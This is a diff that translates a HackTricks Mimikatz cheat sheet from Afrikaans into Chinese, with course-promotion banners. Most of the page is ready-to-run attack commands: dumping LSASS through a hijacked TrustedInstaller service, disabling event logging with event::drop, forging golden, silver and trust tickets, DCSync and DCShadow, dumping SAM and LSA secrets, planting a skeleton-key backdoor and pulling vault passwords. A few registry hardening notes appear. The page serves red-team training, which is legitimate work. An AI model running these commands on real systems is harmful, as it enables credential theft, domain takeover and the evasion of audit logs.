@@ -1,228 +1,227 @@
 # Mimikatz
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
 <figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry gesertifiseer:
+通过 8kSec 学院深化您在 **移动安全** 方面的专业知识。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：
 
 {% embed url="https://academy.8ksec.io/" %}
 
 
-**Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Kyk na die oorspronklike vir verdere inligting!
+**本页面基于 [adsecurity.org](https://adsecurity.org/?page\_id=1821) 的内容**。查看原文以获取更多信息！
 
-## LM en Duidelike Teks in geheue
+## LM 和内存中的明文
 
-Vanaf Windows 8.1 en Windows Server 2012 R2, is beduidende maatreëls geïmplementeer om teen kredietbewysdiefstal te beskerm:
+从 Windows 8.1 和 Windows Server 2012 R2 开始，实施了重要措施以防止凭据被盗：
 
-- **LM hashes en plain-text wagwoorde** word nie meer in geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registrasie instelling, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet geconfigureer word met 'n DWORD waarde van `0` om Digest Authentication te deaktiveer, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gegee word nie.
+- **LM 哈希和明文密码** 不再存储在内存中以增强安全性。必须配置特定的注册表设置，_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_，将 DWORD 值设置为 `0` 以禁用摘要身份验证，确保“明文”密码不会在 LSASS 中缓存。
 
-- **LSA Beskerming** word bekendgestel om die Local Security Authority (LSA) proses te beskerm teen ongeoorloofde geheue lees en kode inspuiting. Dit word bereik deur die LSASS as 'n beskermde proses te merk. Aktivering van LSA Beskerming behels:
-1. Die registrasie te wysig by _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
-2. 'n Groep Beleid Objekt (GPO) te implementeer wat hierdie registrasie verandering oor bestuurde toestelle afdwing.
+- **LSA 保护** 被引入以保护本地安全机构 (LSA) 进程免受未经授权的内存读取和代码注入。这是通过将 LSASS 标记为受保护进程来实现的。激活 LSA 保护涉及：
+1. 修改注册表 _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_，将 `RunAsPPL` 设置为 `dword:00000001`。
+2. 实施一个强制此注册表更改的组策略对象 (GPO)，以便在受管理设备上生效。
 
-Ten spyte van hierdie beskermings, kan gereedskap soos Mimikatz LSA Beskerming omseil deur spesifieke bestuurders te gebruik, alhoewel sulke aksies waarskynlik in gebeurtenislogs aangeteken sal word.
+尽管有这些保护，像 Mimikatz 这样的工具仍然可以使用特定驱动程序绕过 LSA 保护，尽管此类操作可能会被记录在事件日志中。
 
-### Teenwerking van SeDebugPrivilege Verwydering
+### 反制 SeDebugPrivilege 移除
 
-Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongeoorloofde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om kredietbewyse uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
+管理员通常拥有 SeDebugPrivilege，使他们能够调试程序。可以限制此权限以防止未经授权的内存转储，这是攻击者提取内存中凭据的常用技术。然而，即使移除了此权限，TrustedInstaller 账户仍然可以使用自定义服务配置执行内存转储：
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Dit stel die dumping van die `lsass.exe` geheue na 'n lêer in, wat dan op 'n ander stelsel ontleed kan word om kredensiale te onttrek:
+这允许将 `lsass.exe` 的内存转储到文件中，然后可以在另一个系统上进行分析以提取凭据：
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
-## Mimikatz Opsies
+## Mimikatz 选项
 
-Event log manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van gebeurtenislogs en die patching van die Gebeurtenisdienste om die registrasie van nuwe gebeurtenisse te voorkom. Hieronder is die opdragte om hierdie aksies uit te voer:
+在 Mimikatz 中，事件日志篡改涉及两个主要操作：清除事件日志和修补事件服务以防止记录新事件。以下是执行这些操作的命令：
 
-#### Skoonmaak van Gebeurtenislogs
+#### 清除事件日志
 
-- **Opdrag**: Hierdie aksie is daarop gemik om die gebeurtenislogs te verwyder, wat dit moeiliker maak om kwaadwillige aktiwiteite te volg.
-- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit is egter tipies dat gebeurtenislog manipulasie die gebruik van stelsels gereedskap of skripte buite Mimikatz behels om spesifieke logs skoon te maak (bv. met PowerShell of Windows Event Viewer).
+- **命令**：此操作旨在删除事件日志，使追踪恶意活动变得更加困难。
+- Mimikatz 在其标准文档中并未提供直接通过命令行清除事件日志的命令。然而，事件日志操作通常涉及使用系统工具或脚本（例如，使用 PowerShell 或 Windows 事件查看器）来清除特定日志。
 
-#### Eksperimentele Kenmerk: Patching die Gebeurtenisdienste
+#### 实验性功能：修补事件服务
 
-- **Opdrag**: `event::drop`
-- Hierdie eksperimentele opdrag is ontwerp om die gedrag van die Gebeurtenisregistrasiediens te wysig, wat effektief voorkom dat dit nuwe gebeurtenisse opneem.
-- Voorbeeld: `mimikatz "privilege::debug" "event::drop" exit`
+- **命令**：`event::drop`
+- 此实验性命令旨在修改事件日志服务的行为，有效防止其记录新事件。
+- 示例：`mimikatz "privilege::debug" "event::drop" exit`
 
-- Die `privilege::debug` opdrag verseker dat Mimikatz met die nodige voorregte werk om stelseldienste te wysig.
-- Die `event::drop` opdrag patch dan die Gebeurtenisregistrasiediens.
+- `privilege::debug` 命令确保 Mimikatz 以必要的权限操作，以修改系统服务。
+- `event::drop` 命令随后修补事件日志服务。
 
+### Kerberos 票证攻击
 
-### Kerberos Tekenaanvalle
+### 黄金票证创建
 
-### Goue Teken Skepping
+黄金票证允许进行域范围的访问冒充。关键命令和参数：
 
-'n Goue Teken stel in staat tot domein-wye toegang impersonasie. Sleutelopdrag en parameters:
+- 命令：`kerberos::golden`
+- 参数：
+- `/domain`：域名。
+- `/sid`：域的安全标识符（SID）。
+- `/user`：要冒充的用户名。
+- `/krbtgt`：域的 KDC 服务账户的 NTLM 哈希。
+- `/ptt`：直接将票证注入内存。
+- `/ticket`：保存票证以供后用。
 
-- Opdrag: `kerberos::golden`
-- Parameters:
-- `/domain`: Die domeinnaam.
-- `/sid`: Die domein se Veiligheidsidentifiseerder (SID).
-- `/user`: Die gebruikersnaam om te impersonate.
-- `/krbtgt`: Die NTLM-hash van die domein se KDC-diensrekening.
-- `/ptt`: Injekting van die teken direk in geheue.
-- `/ticket`: Stoor die teken vir later gebruik.
-
-Voorbeeld:
+示例：
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
 ### Silver Ticket Creation
 
-Silver Tickets bied toegang tot spesifieke dienste. Sleutelopdrag en parameters:
+Silver Tickets 授予对特定服务的访问权限。关键命令和参数：
 
-- Opdrag: Soortgelyk aan Golden Ticket, maar teiken spesifieke dienste.
+- Command: 类似于 Golden Ticket，但针对特定服务。
 - Parameters:
-- `/service`: Die diens om te teiken (bv., cifs, http).
-- Ander parameters soortgelyk aan Golden Ticket.
+- `/service`: 要针对的服务（例如，cifs，http）。
+- 其他参数类似于 Golden Ticket。
 
-Voorbeeld:
+Example:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
 ### Trust Ticket Creation
 
-Trust Tickets word gebruik om toegang tot hulpbronne oor domeine te verkry deur vertrouensverhoudings te benut. Sleutelopdrag en parameters:
+信任票证用于通过利用信任关系访问跨域资源。关键命令和参数：
 
-- Opdrag: Soortgelyk aan Golden Ticket, maar vir vertrouensverhoudings.
-- Parameters:
-- `/target`: Die FQDN van die teikendomein.
-- `/rc4`: Die NTLM-hash vir die vertrouensrekening.
+- 命令：类似于黄金票证，但用于信任关系。
+- 参数：
+- `/target`：目标域的FQDN。
+- `/rc4`：信任账户的NTLM哈希。
 
-Voorbeeld:
+示例：
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-### Bykomende Kerberos Opdragte
+### 额外的 Kerberos 命令
 
-- **Lys Kaartjies**:
-- Opdrag: `kerberos::list`
-- Lys alle Kerberos kaartjies vir die huidige gebruikersessie.
+- **列出票证**：
+- 命令：`kerberos::list`
+- 列出当前用户会话的所有 Kerberos 票证。
 
-- **Gee die Kas**:
-- Opdrag: `kerberos::ptc`
-- Spuit Kerberos kaartjies in vanaf kaslêers.
-- Voorbeeld: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **传递缓存**：
+- 命令：`kerberos::ptc`
+- 从缓存文件中注入 Kerberos 票证。
+- 示例：`mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Gee die Kaartjie**:
-- Opdrag: `kerberos::ptt`
-- Laat toe om 'n Kerberos kaartjie in 'n ander sessie te gebruik.
-- Voorbeeld: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- **传递票证**：
+- 命令：`kerberos::ptt`
+- 允许在另一个会话中使用 Kerberos 票证。
+- 示例：`mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Verwyder Kaartjies**:
-- Opdrag: `kerberos::purge`
-- Verwyder alle Kerberos kaartjies uit die sessie.
-- Nuttig voor die gebruik van kaartjie manipulasie opdragte om konflikte te vermy.
+- **清除票证**：
+- 命令：`kerberos::purge`
+- 清除会话中的所有 Kerberos 票证。
+- 在使用票证操作命令之前很有用，以避免冲突。
 
-### Aktiewe Gids Manipulasie
+### Active Directory 篡改
 
-- **DCShadow**: Tydelik 'n masjien laat optree as 'n DC vir AD objek manipulasie.
+- **DCShadow**：临时使机器充当 DC 以进行 AD 对象操作。
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Naboots 'n DC om wagwoorddata aan te vra.
+- **DCSync**：模拟 DC 请求密码数据。
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Krediettoegang
+### 凭证访问
 
-- **LSADUMP::LSA**: Trek krediete uit LSA.
+- **LSADUMP::LSA**：从 LSA 中提取凭证。
 - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Naboots 'n DC met 'n rekenaarrekening se wagwoorddata.
-- *Geen spesifieke opdrag verskaf vir NetSync in oorspronklike konteks.*
+- **LSADUMP::NetSync**：使用计算机帐户的密码数据模拟 DC。
+- *原文中未提供 NetSync 的具体命令。*
 
-- **LSADUMP::SAM**: Toegang tot plaaslike SAM databasis.
+- **LSADUMP::SAM**：访问本地 SAM 数据库。
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Ontsleutel geheime wat in die registrasie gestoor is.
+- **LSADUMP::Secrets**：解密存储在注册表中的秘密。
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Stel 'n nuwe NTLM-hash vir 'n gebruiker in.
+- **LSADUMP::SetNTLM**：为用户设置新的 NTLM 哈希。
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Verkry vertrouensverifikasie-inligting.
+- **LSADUMP::Trust**：检索信任认证信息。
 - `mimikatz "lsadump::trust" exit`
 
-### Divers
+### 杂项
 
-- **MISC::Skeleton**: Spuit 'n agterdeur in LSASS op 'n DC.
+- **MISC::Skeleton**：在 DC 上注入后门到 LSASS。
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Privilege Escalation
+### 权限提升
 
-- **PRIVILEGE::Backup**: Verkry rugsteunregte.
+- **PRIVILEGE::Backup**：获取备份权限。
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Verkry debug regte.
+- **PRIVILEGE::Debug**：获取调试权限。
 - `mimikatz "privilege::debug" exit`
 
-### Kredietdumping
+### 凭证转储
 
-- **SEKURLSA::LogonPasswords**: Wys krediete vir ingelogde gebruikers.
+- **SEKURLSA::LogonPasswords**：显示已登录用户的凭证。
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Trek Kerberos kaartjies uit geheue.
+- **SEKURLSA::Tickets**：从内存中提取 Kerberos 票证。
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid en Token Manipulasie
+### Sid 和 Token 操作
 
-- **SID::add/modify**: Verander SID en SIDHistory.
-- Voeg by: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Wysig: *Geen spesifieke opdrag vir wysiging in oorspronklike konteks.*
+- **SID::add/modify**：更改 SID 和 SIDHistory。
+- 添加：`mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- 修改：*原文中未提供修改的具体命令。*
 
-- **TOKEN::Elevate**: Naboots tokens.
+- **TOKEN::Elevate**：模拟令牌。
 - `mimikatz "token::elevate /domainadmin" exit`
 
-### Terminal Dienste
+### 终端服务
 
-- **TS::MultiRDP**: Laat meerdere RDP sessies toe.
+- **TS::MultiRDP**：允许多个 RDP 会话。
 - `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: Lys TS/RDP sessies.
-- *Geen spesifieke opdrag verskaf vir TS::Sessions in oorspronklike konteks.*
+- **TS::Sessions**：列出 TS/RDP 会话。
+- *原文中未提供 TS::Sessions 的具体命令。*
 
-### Kluis
+### Vault
 
-- Trek wagwoorde uit Windows Kluis.
+- 从 Windows Vault 中提取密码。
 - `mimikatz "vault::cred /patch" exit`
 
 
 <figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Verdiep jou kundigheid in **Mobiele Sekuriteit** met 8kSec Akademie. Meester iOS en Android sekuriteit deur ons self-gebaseerde kursusse en kry sertifisering:
+深入了解 **移动安全**，请访问 8kSec 学院。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
